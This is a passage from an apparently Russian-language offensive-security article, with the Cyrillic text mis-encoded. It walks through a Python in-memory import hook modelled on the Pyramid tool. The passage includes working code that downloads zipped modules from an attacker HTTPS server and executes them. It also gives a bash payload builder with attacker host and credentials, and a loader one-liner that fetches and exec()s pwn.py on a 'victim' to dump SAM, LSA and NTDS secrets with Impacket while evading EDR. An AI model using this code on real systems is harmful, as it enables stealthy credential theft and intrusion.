–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ–± –∏–º–µ–Ω–∞—Ö –∏ —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–∏ –º–æ–¥—É–ª—è. –ü–æ–∫–∞ –≤—Å–µ –ø—Ä–æ—Å—Ç–æ.

[![colorama-get-source-code.png](/assets/images/python-pyramid/colorama-get-source-code.png)](/assets/images/python-pyramid/colorama-get-source-code.png)
{:.center-image}

–°–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–æ–≤ —Å –∏—Å—Ö–æ–¥–Ω—ã–º –∫–æ–¥–æ–º –º–æ–¥—É–ª—è colorama
{:.quote}

### CFinder.find_module

```python
def find_module(self, full_name, path=None):
	try:
		self._get_info(self.repo_name, full_name)
	except ImportError:
		return None

	return self
```

–ü–æ–¥–±–∏—Ä–∞–µ–º—Å—è –∫ —Å–∞–º–æ–º—É –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–º—É, –∞ –∏–º–µ–Ω–Ω–æ –∫ –º–µ—Ç–æ–¥–∞–º, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä –ø–æ—Å–ª–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –º–µ—Ç–∞—Ö—É–∫–∞. –ú–µ—Ç–æ–¥ [find_module](https://docs.python.org/3/library/importlib.html#importlib.abc.MetaPathFinder.find_module) –¥–æ–ª–∂–µ–Ω –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –≤ –∫–ª–∞—Å—Å–µ —Ä–µ–∑–æ–ª–≤–µ—Ä–∞ –∏ –æ—Ç–¥–∞–≤–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∑–∞–≥—Ä—É–∑—á–∏–∫–µ –º–æ–¥—É–ª—è. –í –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ –æ–±–µ—Ä—Ç–∫–∞ –Ω–∞–¥ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–º —Ä–∞–Ω–µ–µ –º–µ—Ç–æ–¥–æ–º `_get_info`.

### CFinder.load_module

```python
def load_module(self, full_name):
	_, is_package, full_path, source = self._get_source_code(self.repo_name, full_name)

	code = compile(source, full_path, 'exec')
	spec = importlib.util.spec_from_loader(full_name, loader=None)
	module = sys.modules.setdefault(full_name, importlib.util.module_from_spec(spec))
	module.__loader__ = self
	module.__file__ = full_path
	module.__name__ = full_name

	if is_package:
		module.__path__ = [os.path.dirname(module.__file__)]
	exec(code, module.__dict__)

	return module
```

–°–µ—Ä–¥—Ü–µ –∫–ª–∞—Å—Å–∞ `CFinder` ‚Äî –º–µ—Ç–æ–¥ [load_module](https://docs.python.org/3/library/importlib.html#importlib.abc.Loader.load_module), –≤—ã–∑—ã–≤–∞—é—â–∏–π –≤—Å—Ç—Ä–æ–µ–Ω–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é [compile](https://docs.python.org/3/library/functions.html#compile) –¥–ª—è –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω–æ–π –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∫–æ–¥–∞ –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º–æ–≥–æ –º–æ–¥—É–ª—è –∏ –µ–≥–æ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ –∫ –ø–æ—Å–ª–µ–¥—É—é—â–µ–π –ø–µ—Ä–µ–¥–∞—á–µ –Ω–∞ –≤—Ö–æ–¥ —Ñ—É–Ω–∫—Ü–∏–∏ `exec`. –¢–∞–∫–∂–µ –≤ —Ä–∞–º–∫–∞—Ö —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ –º—ã –æ—Ñ–æ—Ä–º–ª—è–µ–º –æ–±—ä–µ–∫—Ç –º–æ–¥—É–ª—è, —á—Ç–æ–±—ã –¥–ª—è –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ –æ–Ω –Ω–µ –æ—Ç–ª–∏—á–∞–ª—Å—è –æ—Ç –æ–±—ã—á–Ω–æ–≥–æ –∏–º–ø–æ—Ä—Ç–∞ —Å –¥–∏—Å–∫–∞.

–í –æ–±—â–µ–º-—Ç–æ, —ç—Ç–æ –∏ –µ—Å—Ç—å –≤—Å—è –º–∞–≥–∏—è. –í –∫–æ–¥–µ Pyramid –µ—Å—Ç—å —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è –¥—Ä—É–≥–∏—Ö –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤, —Ç–∞–∫–∏—Ö –∫–∞–∫ [get_data](https://docs.python.org/3/library/importlib.html#importlib.abc.ResourceLoader.get_data) –∏ [get_code](https://docs.python.org/3/library/importlib.html#importlib.abc.InspectLoader.get_code), –Ω–æ –¥–ª—è –Ω–∞—Å –æ–Ω–∏ –Ω–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç –∏–Ω—Ç–µ—Ä–µ—Å–∞ –∏ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–∫–ª—é—á–µ–Ω—ã –∏–∑ —Ñ–∏–Ω–∞–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏.

### –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ CFinder

```python
@staticmethod
def install_hook(repo_name):
	if repo_name not in META_CACHE:
		finder = CFinder(repo_name)
		META_CACHE[repo_name] = finder
		sys.meta_path.append(finder)

@staticmethod
def hook_routine(zip_name, zip_bytes):
	ZIPPED[zip_name] = ZipFile(io.BytesIO(zip_bytes), 'r')
	CFinder.install_hook(zip_name)
```

–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞–ø–∏—Å–∞–Ω–Ω—ã–π –∫–ª–∞—Å—Å –ø—Ä–æ—â–µ –ø—Ä–æ—Å—Ç–æ–≥–æ: —Å–Ω–∞—á–∞–ª–∞ –º—ã –≤—ã–∑—ã–≤–∞–µ–º —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –º–µ—Ç–æ–¥ `CFinder.hook_routine` –∏ –æ—Ç–¥–∞–µ–º –µ–º—É –∏–º—è –∏ –±–∞–π—Ç—ã (—Å–æ–¥–µ—Ä–∂–∏–º–æ–µ) ZIP-–∞—Ä—Ö–∏–≤–∞, –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ –∏–∑–≤–Ω–µ. –≠—Ç–æ –¥–æ–±—Ä–æ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ –≥–ª–æ–±–∞–ª—å–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π —Å–ª–æ–≤–∞—Ä—å `ZIPPED`, —É–∂–µ –º–µ–ª—å–∫–∞–≤—à–∏–π –≤ –∫–æ–¥–µ —Ä–∞–Ω–µ–µ, –∏ –¥–∞–ª–µ–µ –º–µ—Ç–∞—Ö—É–∫ —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π `install_hook`. –ü–æ—Å–ª–µ–¥–Ω—è—è –¥–µ–ª–∞–µ—Ç –Ω–∏ —á—Ç–æ –∏–Ω–æ–µ, –∫–∞–∫ –¥–æ–±–∞–≤–ª—è–µ—Ç —ç–∫–∑–µ–º–ø–ª—è—Ä –Ω–∞—à–µ–≥–æ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ –∫–ª–∞—Å—Å–∞ CFinder –∫ —Å–ø–∏—Å–∫—É `sys.meta_path`. –ü—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∏–º–ø–æ—Ä—Ç, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –±—É–¥–µ—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω –Ω–∏–∫–∞–∫–∏–º –¥—Ä—É–≥–∏–º –∏–º–ø–æ—Ä—Ç–µ—Ä–æ–º, –≤ –∏–≥—Ä—É –≤—Å—Ç—É–ø–∏—Ç—å –Ω–∞—à CFinder –∏ –ø–æ–¥–≥—Ä—É–∑–∏—Ç —Ç—Ä–µ–±—É–µ–º—ã–π –º–æ–¥—É–ª—å –∏–∑ –ø–∞–º—è—Ç–∏.

```python
def build_http_request(filename):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE

	request = urllib.request.Request(f'https://{PYRAMID_HOST}:{PYRAMID_PORT}/{filename}.zip')
	auth = b64encode(bytes(f'{PYRAMID_USERNAME}:{PYRAMID_PASSWORD}', 'ascii')).decode()
	request.add_header('Authorization', f'Basic {auth}')

	return context, request

def download_and_import():
	for module in PYRAMID_TO_IMPORT:
		print(f'[*] Downloading and importing module in memory: {module}')

		context, request = build_http_request(module)
		with urllib.request.urlopen(request, context=context) as response:
			zip_bytes = response.read()
			CFinder.hook_routine(module, zip_bytes)

	print('[+] Hooks installed!')
```

–î–ª—è –ø–æ—Ä—è–¥–∫–∞ –ø—Ä–∏–≤–µ–¥—É —Ñ–∏–Ω–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏-–ø–æ–º–æ—â–Ω–∏–∫–∏, –∑–∞–±–∏—Ä–∞—é—â–∏–µ –∑–∏–ø—ã —Å —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –ø–æ HTTPS —Å Basic-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π. –ó–¥–µ—Å—å –≤—Ä–æ–¥–µ –≤—Å–µ –ø–æ–Ω—è—Ç–Ω–æ –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –ø–æ—è—Å–Ω–µ–Ω–∏–π.

### –û—Å–æ–±—ã–µ —Å–ª—É—á–∞–∏ –∏–º–ø–æ—Ä—Ç–∞

–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –Ω–µ –≤—Å–µ –ø–∏—Ç–æ–Ω–æ–≤—Å–∫–∏–µ –º–æ–¥—É–ª–∏ –º–æ–∂–Ω–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–∑ –ø–∞–º—è—Ç–∏. –†–µ—á—å –∏–¥–µ—Ç –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –æ —Ñ–∞–π–ª–∞—Ö `.pyd`, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—â–∏—Ö —Å–æ–±–æ–π –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ —Ä–∞–∑–¥–µ–ª—è–µ–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —Å –±–∞–π—Ç-–∫–æ–¥–æ–º Python, –∏ –æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –¥–ª—è Windows DLL-–ª–∏–±–∞—Ö, –∏–¥—É—â–∏—Ö –≤ –∫–æ–º–ø–ª–µ–∫—Ç–µ —Å –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ –º–æ–¥—É–ª—è–º–∏.

–¢–∞–∫–æ–≥–æ —Å—Ç–∞—Ñ–∞ –Ω–∞–≤–∞–ª–æ–º, –Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ –±–∏–±–ª–∏–æ—Ç–µ–∫–∞—Ö —Å –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ–∏–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –≤—Å–µ–≥–¥–∞ –Ω—É–∂–Ω—ã –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏.

[![cryptodome-pyd.png](/assets/images/python-pyramid/cryptodome-pyd.png)](/assets/images/python-pyramid/cryptodome-pyd.png)
{:.center-image}

PYD-—Ñ–∞–π–ª—ã –≤ –º–æ–¥—É–ª–µ Cryptodome
{:.quote}

–ß—Ç–æ–±—ã —É–¥–æ–≤–ª–µ—Ç–≤–æ—Ä–∏—Ç—å —Ç–∞–∫–∏–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏, –Ω–∞–º –ø—Ä–∏–¥–µ—Ç—Å—è –∑–∞–≥—Ä—É–∂–∞—Ç—å –∏ —Ä–∞—Å–ø–∞–∫–æ–≤—ã–≤–∞—Ç—å –∏—Ö –Ω–∞ –¥–∏—Å–∫. –ó–∞ —ç—Ç–æ –æ—Ç–≤–µ—á–∞–µ—Ç —Ö–µ–ª–ø–µ—Ä `download_and_unpack`:

```python
def download_and_unpack():
for module in PYRAMID_TO_UNPACK:
	print(f'[*] Downloading and unpacking module: {module}')

	context, request = build_http_request(module)
	with urllib.request.urlopen(request, context=context) as response:
		zip_bytes = response.read()

	with ZipFile(io.BytesIO(zip_bytes), 'r') as z:
		z.extractall(os.getcwd())
```

–ü–æ–ª–Ω—ã–π –∫–æ–¥ —Ç–æ–≥–æ, —á—Ç–æ —É –º–µ–Ω—è –ø–æ–ª—É—á–∏–ª–æ—Å—å –ø–æ—Å–ª–µ –Ω–µ–∑–Ω–∞—á–∏—Ç–µ–ª—å–Ω–æ–≥–æ —Ä–µ—Ñ–∞–∫—Ç–æ—Ä–∏–Ω–≥–∞ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞, –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ [—É –º–µ–Ω—è –Ω–∞ GitHub](https://gist.github.com/snovvcrash/39263ccae8e07210c3f87c9472b4c908#file-cfinder-py). –†—è–¥–æ–º –ª–µ–∂–∞—Ç –ø—Ä–µ—Å–µ—Ç—ã –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –±–æ–µ–≤—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤ –Ω–∞ –æ—Å–Ω–æ–≤–µ –æ–±—â–µ–≥–æ —Ç–µ–º–ø–ª–µ–π—Ç–∞, –∫–æ—Ç–æ—Ä—ã–º–∏ –º—ã –±—É–¥–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ —Å–ª–µ–¥—É—é—â–µ–º —Ä–∞–∑–¥–µ–ª–µ.

–ü–æ–∫–∞ –≥–æ—Ç–æ–≤–∏–ª –º–∞—Ç–µ—Ä–∏–∞–ª—ã –¥–ª—è —Å—Ç–∞—Ç—å–∏, –Ω–∞—à–µ–ª –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–π —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π **httpimport**, –∫–æ—Ç–æ—Ä—ã–π, —Å—É–¥—è –ø–æ –æ–ø–∏—Å–∞–Ω–∏—é, —É–º–µ–µ—Ç –¥–µ–ª–∞—Ç—å –≤—Å–µ —Ç–æ –∂–µ —Å–∞–º–æ–µ, —á—Ç–æ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–ª–∏ –º—ã, –Ω–æ —Å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–º–∏ –ø–ª—é—à–∫–∞–º–∏.

–°–∞–º —è —ç—Ç–æ—Ç –∫–æ–¥ –Ω–µ —Ç–µ—Å—Ç–∏–ª, –Ω–æ, –º–æ–∂–µ—Ç, —Ç–µ–±–µ –±—É–¥–µ—Ç –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ —Å –Ω–∏–º –ø–æ–∏–≥—Ä–∞—Ç—å:

- [operatorequals/httpimport: Module for remote in-memory Python package/module loading through HTTP/S](https://github.com/operatorequals/httpimport)

# Pyramid –≤ –¥–µ–π—Å—Ç–≤–∏–∏

## impacket-secretsdump

–ü—Ä–µ–¥—Å—Ç–∞–≤–∏–º, —á—Ç–æ –º—ã –æ–∫–∞–∑–∞–ª–∏—Å—å –Ω–∞ –º–∞—à–∏–Ω–µ —Å EDR, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ –¥–∞–µ—Ç –Ω–∞–º [—Å–¥–∞–º–ø–∏—Ç—å —Å–µ–∫—Ä–µ—Ç—ã LSA](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets), [–ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ö—Ä–∞–Ω–∏–ª–∏—â—É SAM](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry) –∏–ª–∏ [–ø—Ä–æ–≤–µ—Å—Ç–∏ DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync), –ø–æ—Ç–æ–º—É —á—Ç–æ [Invoke-Mimikatz.ps1](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1) –æ—Ç–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è –≥—Ä—É–∑–∏—Ç—å—Å—è –≤ –ø–∞–º—è—Ç—å.

–ö–æ–Ω–µ—á–Ω–æ –∂–µ –ø–µ—Ä–≤–æ–µ, —á—Ç–æ –ø—Ä–∏—Ö–æ–¥–∏—Ç –Ω–∞ —É–º –≤ —ç—Ç–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏, —ç—Ç–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) –∏–∑ –∫–æ–ª–ª–µ–∫—Ü–∏–∏ Impacket, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç –ø–æ–º–æ—á—å —Å–ø—Ä–∞–≤–∏—Ç—å—Å—è —Å –ª—é–±–æ–π –∏–∑ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω—ã—Ö –≤—ã—à–µ –∑–∞–¥–∞—á. –ö–∞–∫ –º—ã —É–∂–µ –ø–æ–Ω—è–ª–∏, –ø—Ä–æ—Å—Ç–æ –ø–æ–ª–æ–∂–∏—Ç—å –º–æ–¥—É–ª—å Impacket –Ω–∞ –¥–∏—Å–∫ –Ω–µ –ø–æ–ª—É—á–∏—Ç—Å—è, –∏ –≤ —ç—Ç–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏ –ø—Ä–∏—à–ª–æ—Å—å –±—ã –ø—Ä–æ–∫—Å–∏—Ä–æ–≤–∞—Ç—å —Ç—Ä–∞—Ñ–∏–∫ –≤–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω—é—é —Å–µ—Ç—å, —á—Ç–æ–±—ã –∑–∞—é–∑–∞—Ç—å `secretsdump.py` —É–¥–∞–ª–µ–Ω–Ω–æ. –ù–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –∏ –Ω–∞ —Å–∞–º–æ–π –º–∞—à–∏–Ω–µ-–∂–µ—Ä—Ç–≤–µ —Å –ø–æ–º–æ—â—å—é –±–µ–∑—Ñ–∞–π–ª–æ–≤–æ–≥–æ –∏–º–ø–æ—Ä—Ç–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π.

–ß—Ç–æ–±—ã —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å `secretsdump.py`, –Ω–∞–º –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–ø–∞–∫–æ–≤–∞—Ç—å [—Å–ø–∏—Å–æ–∫ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/requirements.txt), —á—Ç–æ —É–∂–µ —Å–¥–µ–ª–∞–ª –∑–∞ –Ω–∞—Å –∞–≤—Ç–æ—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞. –î–∞–ª–µ–µ —è –ø–æ–∫–∞–∂—É, –∫–∞–∫ —ç—Ç–æ –º–æ–∂–Ω–æ –ø—Ä–∏–º–µ–Ω–∏—Ç—å –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –¥—Ä—É–≥–∏—Ö –º–æ–¥—É–ª–µ–π, –∞ –ø–æ–∫–∞ –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è –≥–æ—Ç–æ–≤—ã–º–∏ –∞—Ä—Ö–∏–≤–∞–º–∏ [–∏–∑ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ Server](https://github.com/naksyn/Pyramid/tree/main/Server).

–î–ª—è –Ω–∞–≥–ª—è–¥–Ω–æ—Å—Ç–∏ —è –ø–æ–¥–≥–æ—Ç–æ–≤–∏–ª –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–æ—Å—Ç—ã—Ö Bash-—Å–∫—Ä–∏–ø—Ç–æ–≤, –≥–µ–Ω–µ—Ä–∏—Ä—É—é—â–∏—Ö —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –ø–µ–π–ª–æ–∞–¥. –í–æ—Ç –∫–∞–∫ –≤—ã–≥–ª—è–¥–∏—Ç —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Å–±–æ—Ä–∫–∏ `secretsdump.py`:

```bash
#!/usr/bin/env bash

cat << EOT > pwn.py
PYRAMID_HOST = '10.10.13.37'
PYRAMID_PORT = '443'
PYRAMID_USERNAME = 'attacker'
PYRAMID_PASSWORD = 'Passw0rd1!'
PYRAMID_TO_UNPACK = ('Cryptodome',)
PYRAMID_TO_IMPORT = (
    'setuptools',
    'pkg_resources',
    'jaraco',
    '_distutils_hack',
    'distutils',
    'cffi',
    'configparser',
    'future',
    'chardet',
    'flask',
    'ldap3',
    'ldapdomaindump',
    'pyasn1',
    'OpenSSL',
    'pyreadline',
    'six',
    'markupsafe',
    'werkzeug',
    'jinja2',
    'click',
    'itsdangerous',
    'dns',
    'impacket',)

SECRETSDUMP_TARGET = '127.0.0.1'
SECRETSDUMP_DOMAIN = 'megacorp.local'
SECRETSDUMP_USERNAME = 'j.doe'
SECRETSDUMP_PASSWORD = 'Passw0rd2!'
EOT

cat {cfinder,secretsdump}.py >> pwn.py
```

–ó–¥–µ—Å—å `cfinder.py` ‚Äî —à–∞–±–ª–æ–Ω, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π –±–∞–∑–æ–≤—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é –∫–ª–∞—Å—Å–∞ CFinder, –∞ `secretsdump.py` ‚Äî –Ω–µ–º–Ω–æ–≥–æ [–∏–∑–º–µ–Ω–µ–Ω–Ω—ã–π secretsdump.py](https://github.com/naksyn/Pyramid/blob/7f1a839e9667d1c5a5c32fddfad3d353d8410682/Server/base-impacket-secretsdump.py#L201-L611) —Å –ø—Ä–µ–¥–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º –Ω–∞–±–æ—Ä–æ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö (–≤—Ö–æ–¥–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤) `SECRETSDUMP_*`, –∑–∞–¥–∞–Ω–Ω—ã—Ö –≤ —Å–∫—Ä–∏–ø—Ç–µ –≤—ã—à–µ.

–î–ª—è –Ω—É–∂–¥ —Ö–æ—Å—Ç–∏–Ω–≥–∞ —Ñ–∞–π–ª–æ–≤ –∞–≤—Ç–æ—Ä –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é [—Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é](https://github.com/naksyn/Pyramid/blob/main/Server/PyramidHTTP.py) –ø—Ä–æ—Å—Ç–æ–≥–æ HTTPS-—Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ Python —Å Basic-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π, –æ–¥–Ω–∞–∫–æ —è –±—É–¥—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å [http-server](https://github.com/http-party/http-server), –æ—á–µ–Ω—å –ø–æ–ª—é–±–∏–≤—à–∏–π—Å—è –º–Ω–µ –ø—Ä–∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏–∏ –ø–µ–Ω—Ç–µ—Å—Ç–æ–≤.

–Ø —Å–≥–µ–Ω–µ—Ä–∏—Ä—É—é —Ñ–∏–Ω–∏–Ω–∞–ª—å–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É, –∞ –∑–∞—Ç–µ–º –¥–≤—É–º—è –∫–æ–º–∞–Ω–¥–∞–º–∏ —Å–æ–∑–¥–∞–º —Å–∞–º–æ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–π SSL-—Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç –∏ –ø–æ–¥–Ω–∏–º—É HTTP-—Å–µ—Ä–≤–µ—Ä —Å —É–∫–∞–∑–∞–Ω–∏–µ–º –∫—Ä–µ–¥ –¥–ª—è Basic-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.

```terminal?prompt=$
~$ ./secretsdump.sh
~$ openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
~$ http-server -d false -p 443 -S --username attacker --password 'Passw0rd1!'
```

[![http-server-setup.png](/assets/images/python-pyramid/http-server-setup.png)](/assets/images/python-pyramid/http-server-setup.png)
{:.center-image}

–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ HTTP-—Å–µ—Ä–≤–µ—Ä–∞ —Å SSL-—Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–º –∏ Basic-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π
{:.quote}

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –Ω–∞ –Ω–∞—à–µ–π –∏–º–ø—Ä–æ–≤–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –º–∞—à–∏–Ω–µ-–∂–µ—Ä—Ç–≤–µ —è –∑–∞–≥—Ä—É–∂—É —Å–≤–µ–∂–∏–π —Ä–µ–ª–∏–∑ standalone-–∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–∞ Python —Å –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ —Å–∞–π—Ç–∞, –∑–∞–ø—É—â—É `python.exe` –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∏ –≤—ã–ø–æ–ª–Ω—é –∫–æ–º–∞–Ω–¥—ã –∑–∞–≥—Ä—É–∑—á–∏–∫–∞.

```python
import ssl
import urllib.request
from base64 import b64encode
context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE
request = urllib.request.Request('https://10.10.13.37/pwn.py')
auth = b64encode(bytes('attacker:Passw0rd1!', 'ascii')).decode()
request.add_header('Authorization', f'Basic {auth}')
payload = urllib.request.urlopen(request, context=context).read()
exec(payload)
```

[![pyramid-secretsdump-sam-lsa.png](/assets/images/python-pyramid/pyramid-secretsdump-sam-lsa.png)](/assets/images/python-pyramid/pyramid-secretsdump-sam-lsa.png)
{:.center-image}

–¢—è–Ω–µ–º SAM –∏ LSA –Ω–∞ –º–∞—à–∏–Ω–µ —Å EDR
{:.quote}

–í—É–∞–ª—è, –º—ã –ø–æ–ª—É—á–∏–ª–∏ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ SAM –∏ LSA, –Ω–µ –≤–≤–æ–¥—è –ø—Ä–∏ —ç—Ç–æ–º —Å—Ç—Ä–∞—à–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ –≤—Ä–æ–¥–µ `reg save hklm\system ololo.hive`. –¢–∞–∫ –∂–µ –ª–µ–≥–∫–æ —è –º–æ–≥—É —Å–¥–∞–º–ø–∏—Ç—å NTDS –≤ –¥–æ–º–µ–Ω–Ω–æ–π —Å—Ä–µ–¥–µ —É–¥–∞–ª–µ–Ω–Ω–æ –±–µ–∑ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –≤—Ä–æ–¥–µ Mimikatz.

[![pyramid-secretsdump-dcsync.png](/assets/images/python-pyramid/pyramid-secretsdump-dcsync.png)](/assets/images/python-pyramid/pyramid-secretsdump-dcsync.png)
{:.center-image}

DCSync the Planet!
{:.quote}

## SOCKS over SSH

